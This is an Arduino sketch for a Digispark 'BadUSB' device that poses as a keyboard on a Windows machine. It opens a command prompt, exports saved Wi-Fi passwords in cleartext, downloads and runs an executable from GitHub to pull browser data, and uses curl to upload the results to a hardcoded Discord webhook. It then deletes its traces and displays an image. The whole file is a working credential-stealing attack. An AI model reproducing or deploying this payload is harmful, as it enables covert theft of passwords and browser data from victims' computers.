#include "DigiKeyboard.h"

// --- Configuration ---
// 1. URL DE TELECHARGEMENT DIRECT ".exe" PYTHON COMPILÉ
#define EXTRACTOR_URL "https://github.com/Zeillo0w/digispark-script/raw/main/dist/decryptor.exe"

// 2. WEBHOOK DISCORD
#define DISCORD_WEBHOOK_URL "https://discord.com/api/webhooks/1349047158208204820/FyJoxYiHDnjNHX0WOFltcXlDfUAztkTMG6Q3pF1ruxQ0AYzVr5Fw09OJKTj6ARDacjOP

// 3. NOMS DES FICHIERS TELS QU'ILS APPARAITRONT SUR DISCORD
#define DISCORD_WIFI_FILENAME "wifi_passwords.txt"
#define DISCORD_EXTRACTED_DATA_FILENAME "extracted_browser_data.txt"

// 4. NOMS DES FICHIERS TEMPORAIRES LOCAUX SUR LA MACHINE CIBLE
#define LOCAL_WIFI_FILENAME "wifi-pass.txt"
#define LOCAL_EXTRACTOR_FILENAME "decryptor.exe"
#define LOCAL_EXTRACTED_DATA_FILENAME "extracted_data.txt"

// 5. DÉLAIS
#define DELAY_INITIAL 3000
#define DELAY_CMD_READY 2500
#define DELAY_NETSH 2000
#define DELAY_WIFI_PARSE 1500
#define DELAY_DOWNLOAD 15000
#define DELAY_EXECUTION 10000
#define DELAY_UPLOAD 6000
#define DELAY_CLEANUP 500
#define DELAY_FINAL_LED 3000

#define WALLPAPER_FILENAME "hacked.jpg"

// --- Fin Configuration ---

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(DELAY_INITIAL);

  // --- Étape 1: Ouvrir l'invite de commandes (CMD) ---
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY_CMD_READY);

  // --- Étape 2: Se déplacer dans le dossier temporaire ---
  DigiKeyboard.println(F("cd %temp%"));
  DigiKeyboard.delay(500);

  // --- Étape 3: Extraire les mots de passe WiFi ---
  DigiKeyboard.println(F("netsh wlan export profile key=clear > nul 2>&1"));
  DigiKeyboard.delay(DELAY_NETSH);

  // CORRIGÉ: Commande PowerShell
  DigiKeyboard.print(F("powershell -Command \"Select-String -Path Wi*.xml -Pattern 'keyMaterial' | Out-File -FilePath "));
  DigiKeyboard.print(F(LOCAL_WIFI_FILENAME));
  DigiKeyboard.print(F(" -Encoding utf8 -NoNewline\"")); // Fin de la commande PS
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Exécuter la commande
  DigiKeyboard.delay(DELAY_WIFI_PARSE);

  // --- Étape 4: Télécharger et exécuter l'extracteur (.exe) ---
  // Commande PowerShell
  DigiKeyboard.print(F("powershell -Command \"try { (New-Object System.Net.WebClient).DownloadFile('"));
  DigiKeyboard.print(F(EXTRACTOR_URL));
  DigiKeyboard.print(F("', '"));
  DigiKeyboard.print(F(LOCAL_EXTRACTOR_FILENAME));
  DigiKeyboard.print(F("') } catch {}\""));       // Fin de la commande PS
  DigiKeyboard.sendKeyStroke(KEY_ENTER);// Exécuter la commande
  DigiKeyboard.delay(DELAY_DOWNLOAD);

  // Exécute l'outil .exe téléchargé
  DigiKeyboard.print(F("start /b "));
  DigiKeyboard.print(F(LOCAL_EXTRACTOR_FILENAME));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY_EXECUTION);

  // --- Étape 5: Envoyer les fichiers extraits via Webhook Discord ---
  // Envoi du fichier contenant les mots de passe WiFi
  DigiKeyboard.print(F("curl -F \"file=@"));
  DigiKeyboard.print(F(LOCAL_WIFI_FILENAME));
  DigiKeyboard.print(F(";filename="));
  DigiKeyboard.print(F(DISCORD_WIFI_FILENAME));
  DigiKeyboard.print(F("\" ")); // Important: espace après le guillemet fermant de filename
  DigiKeyboard.print(F(DISCORD_WEBHOOK_URL));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY_UPLOAD);

  // Envoi du fichier contenant les données extraites par l'outil Python (.exe)
  DigiKeyboard.print(F("curl -F \"file=@"));
  DigiKeyboard.print(F(LOCAL_EXTRACTED_DATA_FILENAME));
  DigiKeyboard.print(F(";filename="));
  DigiKeyboard.print(F(DISCORD_EXTRACTED_DATA_FILENAME));
  DigiKeyboard.print(F("\" ")); // Important: espace
  DigiKeyboard.print(F(DISCORD_WEBHOOK_URL));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY_UPLOAD + 2000);

  // --- Étape 6: Nettoyage des fichiers temporaires ---
  DigiKeyboard.println(F("del Wi*.xml /f /q > nul 2>&1"));
  DigiKeyboard.delay(DELAY_CLEANUP);

  DigiKeyboard.print(F("del "));
  DigiKeyboard.print(F(LOCAL_WIFI_FILENAME));
  DigiKeyboard.println(F(" /f /q > nul 2>&1"));
  DigiKeyboard.delay(DELAY_CLEANUP);

  DigiKeyboard.print(F("del "));
  DigiKeyboard.print(F(LOCAL_EXTRACTOR_FILENAME)); // Supprime l'.exe
  DigiKeyboard.println(F(" /f /q > nul 2>&1"));
  DigiKeyboard.delay(DELAY_CLEANUP);

  DigiKeyboard.print(F("del "));
  DigiKeyboard.print(F(LOCAL_EXTRACTED_DATA_FILENAME));
  DigiKeyboard.println(F(" /f /q > nul 2>&1"));
  DigiKeyboard.delay(DELAY_CLEANUP);

  // --- Étape 7: "Payload" additionnel (Optionnel) ---
  // CORRIGÉ: Commande PowerShell
  DigiKeyboard.print(F("powershell -windowstyle hidden -command \"(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/A3MY9or.jpeg','$env:UserProfile\\desktop\\catz.jpeg');invoke-item $env:UserProfile\\desktop\\catz.jpeg\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- Étape 8: Fermer CMD et Fin ---
  DigiKeyboard.println(F("exit"));
  DigiKeyboard.delay(500);

  digitalWrite(1, HIGH);
  DigiKeyboard.delay(DELAY_FINAL_LED);
  digitalWrite(1, LOW);

  while(1) {
    DigiKeyboard.delay(5000);
  }
}